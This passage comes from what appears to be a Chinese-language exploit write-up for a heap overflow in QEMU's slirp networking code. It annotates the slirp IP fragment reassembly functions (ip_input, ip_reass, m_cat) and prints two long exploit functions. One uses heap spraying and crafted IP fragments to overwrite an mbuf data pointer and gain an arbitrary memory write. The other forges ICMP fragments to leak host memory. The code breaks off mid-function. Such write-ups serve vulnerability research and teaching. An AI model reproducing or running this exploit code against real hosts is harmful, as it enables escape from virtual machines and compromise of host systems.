class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">ip_input(struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If offset or IP_MF are set, must reassemble.</span></span><br><span class="line"><span class="comment">	 * Otherwise, nothing need be done.</span></span><br><span class="line"><span class="comment">	 * (We could look in the reassembly queue to see</span></span><br><span class="line"><span class="comment">	 * if the packet was previously fragmented,</span></span><br><span class="line"><span class="comment">	 * but it's not worth the time; just let them time out.)</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * XXX This should fail, don't fragment yet</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	...	</span><br><span class="line"><span class="keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123; <span class="comment">//ip-&gt;ip_off不包含IP_DF(Don't Fragment)标志位才能触发ip_reass</span></span><br><span class="line">	  <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">qlink</span> *<span class="title">l</span>;</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Look for queue of fragments</span></span><br><span class="line"><span class="comment">		 * of this datagram.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;</span><br><span class="line">		     l = l-&gt;next) &#123;</span><br><span class="line">            fp = container_of(l, struct ipq, ip_link);</span><br><span class="line">            <span class="keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp; <span class="comment">//发送大量id不同的数据包,使if条件无法满足,进而找不到之前的数据包,导致fp为NULL</span></span><br><span class="line">                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_p == fp-&gt;ipq_p)</span><br><span class="line">		    <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = <span class="literal">NULL</span>;</span><br><span class="line">	found:</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Adjust ip_len to not reflect header,</span></span><br><span class="line"><span class="comment">		 * set ip_mff if more fragments are expected,</span></span><br><span class="line"><span class="comment">		 * convert offset of this to bytes.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ip-&gt;ip_len -= hlen;</span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_off &amp; IP_MF) <span class="comment">//含有IP_MF(More Fragment)标志位时,ip_tos带有1,不含有时ip_tos不带有1</span></span><br><span class="line">		  ip-&gt;ip_tos |= <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		  ip-&gt;ip_tos &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		ip-&gt;ip_off &lt;&lt;= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If datagram marked as having more fragments</span></span><br><span class="line"><span class="comment">		 * or if this is not the first fragment,</span></span><br><span class="line"><span class="comment">		 * attempt reassembly; if it succeeds, proceed.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">			ip = ip_reass(slirp, ip, fp);<span class="comment">//我们的目的是使fp=NULL的时候,进入ip_reass函数</span></span><br><span class="line">                        <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			m = dtom(slirp, ip);</span><br><span class="line">		&#125; <span class="keyword">else</span></span><br><span class="line">			<span class="keyword">if</span> (fp)</span><br><span class="line">		   	   ip_freef(slirp, fp);</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		ip-&gt;ip_len -= hlen;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *</span></span><br><span class="line"><span class="class"><span class="title">ip_reass</span>(<span class="title">Slirp</span> *<span class="title">slirp</span>, <span class="title">struct</span> <span class="title">ip</span> *<span class="title">ip</span>, <span class="title">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m</span> = <span class="title">dtom</span>(<span class="title">slirp</span>, <span class="title">ip</span>);</span></span><br><span class="line">	<span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipasfrag</span> *<span class="title">q</span>;</span></span><br><span class="line">	<span class="keyword">int</span> hlen = ip-&gt;ip_hl &lt;&lt; <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">int</span> i, next;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Reassembly is complete; concatenate fragments.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="keyword">if</span> (((struct ipasfrag *)(q-&gt;ipf_prev))-&gt;ipf_tos &amp; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;                        <span class="comment">//若后续还有IP分片(IP_MF位为1),则直接返回NULL,若IP_MF不为1则表示当前分片是最后一个分片,可以开始进行分片的重组了,进入下面的代码</span></span><br><span class="line">    </span><br><span class="line">    q = fp-&gt;frag_link.next;</span><br><span class="line">	m = dtom(slirp, q);</span><br><span class="line"></span><br><span class="line">	q = (struct ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">	<span class="keyword">while</span> (q != (struct ipasfrag*)&amp;fp-&gt;frag_link) &#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> = <span class="title">dtom</span>(<span class="title">slirp</span>, <span class="title">q</span>);</span></span><br><span class="line">	  q = (struct ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">	  m_cat(m, t); <span class="comment">//分片的拼接函数</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copy data from one mbuf to the end of</span></span><br><span class="line"><span class="comment"> * the other.. if result is too big for one mbuf, allocate</span></span><br><span class="line"><span class="comment"> * an M_EXT data segment</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">m_cat(struct mbuf *m, struct mbuf *n)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If there's no room, realloc</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (M_FREEROOM(m) &lt; n-&gt;m_len)</span><br><span class="line">		m_inc(m, m-&gt;m_len + n-&gt;m_len);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len); <span class="comment">//任意地址写任意值</span></span><br><span class="line">	m-&gt;m_len += n-&gt;m_len;</span><br><span class="line"></span><br><span class="line">	m_free(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当数据包是最后一个切片数据包时（<code>IP_MF</code>不为1），<code>ip_reass</code>函数中会调用<code>m_cat</code>将数据包组合起来。关键代码是<code>memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len)</code>，如果我们可以利用堆溢出覆盖<code>m</code>结构体的<code>m_data</code>和<code>m_len</code>，则就可以实现将可控的数据<code>n-&gt;m_data</code>写到任意的地址<code>m-&gt;m_data+m-&gt;m_len</code>处。</p>
<p>exp中任意地址写函数关键代码如下，首先利用<code>malloc原语</code>将清空堆，使得堆排布可控。接着利用与<code>host</code>主机<code>113</code>端口建立<code>socket</code>连接，申请出来可溢出的<code>struct sbuf *so_rcv</code>结构体。紧接着在后面分配一个ip切片数据包<code>mbuf</code>，其<code>id</code>为<code>0xdead</code>。由于堆的排布，该数据包是紧贴着<code>so_rcv</code>的，可以利用堆溢出覆盖<code>mbuf</code>中的<code>m_data</code>指针。最后再次发送相同<code>id(0xdead)</code>并且<code>IP_MF</code>标志为0的数据包，<code>memcpy</code>拷贝至<code>m_data</code>指针处时，实现任意地址写，因为<code>ip-&gt;ip_off</code>设为<code>0x318</code>，所以实际上是向<code>addr+0x318</code>的地址写数据。</p>
<p>需要注意的是每次<code>arbitrary_write</code>函数之后，<code>server</code>的连接都会断开一次，因为函数最后里把建立了连接的<code>fd</code>给<code>close</code>了，为了之后的利用我们需要把<code>server</code>重新设为监听状态，这也是我为什么在函数最后加了一个<code>getchar()</code>，这是为了重新让<code>server</code>重新运行<code>sudo nc -lvv 113</code>命令再继续运行<code>exp</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">arbitrary_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">int</span> addr_len, <span class="keyword">uint8_t</span> *write_data,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="keyword">int</span> write_data_len, <span class="keyword">int</span> spray_times)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, len, i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *payload = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="keyword">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="keyword">uint32_t</span> *payload32 = (<span class="keyword">uint32_t</span> *)payload;</span><br><span class="line">    <span class="keyword">uint64_t</span> *payload64 = (<span class="keyword">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"spraying size 0x2000, id: %d\n"</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    dbg_printf(<span class="string">"spray finished.\n"</span>);    <span class="comment">//堆喷将堆变得稳定</span></span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    ret = connect(s, (struct sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"oops: client"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;                                          <span class="comment">//创建出可溢出的so_rcv结构体</span></span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">//这个packet就在so_rcv的后面</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">20000</span>); <span class="comment">// 不知道为啥，貌似内核会合并包？</span></span><br><span class="line">                       <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">                       <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">"send %d complete\n"</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);        <span class="comment">//从for循环到这里的六次write是为了填充so_rcv到我们要溢出的m_buf之间的无用数据</span></span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="keyword">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="keyword">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="keyword">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="keyword">uint8_t</span> *)payload - payload_start); <span class="comment">//真正的溢出,在这一步覆盖掉第一个分片的各个数据结构</span></span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>; <span class="comment">//实际上是向addr+0x318的地址写任意值</span></span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;              <span class="comment">//设为0,触发m_cat</span></span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, write_data, write_data_len); <span class="comment">//触发任意地址写任意值!!!</span></span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">    <span class="keyword">if</span> (stop_flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"trigger!"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Infoleak"><a href="#Infoleak" class="headerlink" title="Infoleak"></a>Infoleak</h3><p>前两步如果成功了的话，这一步就几乎百分之百成功，只是泄露出来的数据貌似无法预测，没什么标志性数据，每次接受到的几乎都是不一样的数据，这也是导致了最后的成功率很低的原因之一。</p>
<p>泄露的原理使用的是伪造<code>ICMP</code>协议数据包：</p>
<ol>
<li>先用一次任意地址写任意值在堆的前面(低位为<code>0x000b00</code>)写入一个伪造的<code>ICMP</code>包头，也就是<code>main</code>函数最开始做的事情。</li>
<li>发送一个<code>ICMP</code>请求，<code>IP_MF</code>位置1。</li>
<li>第二次溢出修改第二步的<code>mbuf</code>的<code>m_data</code>的低位至第一步伪造的<code>ICMP</code>包头的起始地址，这一步实际上完成了一个<code>ICMP</code>包的伪造，因为堆前面的那个地方我们只伪造了一个<code>ICMP</code>数据包的头部，真实的数据部分除了我们的命令之外就是脏数据了，也是最后<code>ICMP</code>应答包的数据来源。</li>
<li>发送<code>IP_MF</code> 为0，<code>payloadlen</code>为0的包结束<code>ICMP</code>请求。</li>
<li>得到<code>ICMP</code>应答包，得到脏数据。</li>
</ol>
<p>所以这一步的目的不在于写，而是溢出改<code>ICMP</code>第一个分片的<code>mbuf-&gt;m_data</code>为第一步伪造的<code>ICMP_header</code>，写只是为了结束<code>ICMP</code>请求罢了，所以<code>payloadlen</code>为0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">int</span> addr_len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, len, i, recvsd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *payload = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="keyword">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="keyword">uint32_t</span> *payload32 = (<span class="keyword">uint32_t</span> *)payload;</span><br><span class="line">    <span class="keyword">uint64_t</span> *payload64 = (<span class="keyword">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    dbg_printf(<span class="string">"in leak_text...\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"spraying size 0x2000, id: %d\n"</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    dbg_printf(<span class="string">"spray finished.\n"</span>);          <span class="comment">//堆喷使堆变得稳定</span></span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    ret = connect(s, (struct sockaddr *)&amp;ip_addr, len); <span class="comment">//构造可以溢出的sp_rcv</span></span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"0ops: client"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP; <span class="comment">//注意这里为ICMP协议数据包</span></span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let's overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">20000</span>); <span class="comment">// 不知道为啥，貌似内核会合并包？</span></span><br><span class="line">                       <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">                       <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">"send %d complete\n"</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>); <span class="comment">//填充无用数据,参见上一步</span></span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="keyword">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="keyword">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="keyword">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="keyword">uint8_t</span> *)payload - payload_start); <span class="comment">//修改m_data的低位至之前伪造的包头地址</span></span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    dbg_printf(<span class="string">"trigger reass!"</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="string">'A'</span>,<span class="number">0x1000</span>); <span class="comment">//这一步的payload无关紧要,所以可以随意填,传的时候payloadlen传0即可</span></span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>; <span class="comment">//MF置为0结束ICMP请求</span></span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP; <span class="comment">//注意为ICMP协议数据包</span></span><br><span class="line"></span><br><span class="line">    recvsd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); <span class="comment">//在ICMP请求结束前建立socket,结束后就接收不到应答包了</span></span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0</span>); <span class="comment">//payloadlen为0,结束ICMP请求</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// we receive data here</span></span><br><span class="line">    <span class="keyword">int</span> bytes, status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> 